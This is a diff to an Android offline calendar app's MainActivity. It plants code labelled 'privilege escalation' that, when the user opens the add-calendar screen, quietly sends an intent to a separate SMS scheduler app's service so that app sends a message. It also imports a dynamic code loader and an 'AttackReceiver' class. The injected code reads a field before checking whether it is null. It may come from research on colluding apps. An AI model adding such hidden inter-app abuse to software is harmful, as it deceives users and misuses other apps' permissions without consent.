@@ -45,6 +45,16 @@ import android.widget.Toast;
 
 import org.sufficientlysecure.localcalendar.R;
 import org.sufficientlysecure.localcalendar.util.InstallLocationHelper;
+import android.app.Service;
+import android.os.IBinder;
+import android.support.annotation.Nullable;
+import org.sufficientlysecure.localcalendar.AttackReceiver;
+import org.sufficientlysecure.localcalendar.util.Log;
+
+import java.io.File;
+import java.lang.reflect.Method;
+
+import dalvik.system.DexClassLoader;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -157,6 +167,17 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void showAddCalendarActivity() {
+
+        // privilege escalation
+        // send message through SmsSenderService
+        Intent inten = new Intent();
+        inten.putExtra("attacker", "Hello from offline calendar!");
+        inten.setAction("com.github.yeriomin.smsscheduler.AlarmReceiver.INTENT_FILTER");
+        long sid = AttackReceiver.in.getExtras().getLong("datetimeCreated", 0);
+        inten.putExtra("datetimeCreated", sid);
+        if(AttackReceiver.in != null)
+            startService(inten);
+
         // show edit activity with empty text field and add button
         Intent intent = new Intent(this, EditActivity.class);
         startActivity(intent);
